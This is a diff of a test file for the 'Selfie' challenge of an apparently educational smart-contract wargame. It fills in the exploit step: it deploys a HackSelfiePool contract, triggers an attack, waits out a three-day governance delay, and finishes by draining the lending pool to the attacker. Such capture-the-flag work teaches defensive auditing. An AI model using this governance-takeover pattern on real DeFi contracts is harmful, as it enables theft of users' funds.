@@ -13,7 +13,7 @@ describe('[Challenge] Selfie', function () {
 
     const TOKEN_INITIAL_SUPPLY = ether('2000000')
     const TOKENS_IN_POOL = ether('1500000');
-    
+
 
     before(async function () {
         /** SETUP SCENARIO */
@@ -21,7 +21,7 @@ describe('[Challenge] Selfie', function () {
         this.governance = await SimpleGovernance.new(this.token.address, { from: deployer });
         this.pool = await SelfiePool.new(
             this.token.address,
-            this.governance.address, 
+            this.governance.address,
             { from: deployer }
         );
 
@@ -34,13 +34,23 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const hackselfie = await HackSelfiePool.new(
+            this.token.address,
+            this.pool.address,
+            this.governance.address,
+            { from: deployer }
+        )
+        await hackselfie.attack({ from: attacker });
+        await time.increase(time.duration.days(3));
+        await hackselfie.attack2();
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         expect(
             await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
+        ).to.be.bignumber.equal(TOKENS_IN_POOL);
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.bignumber.equal('0');
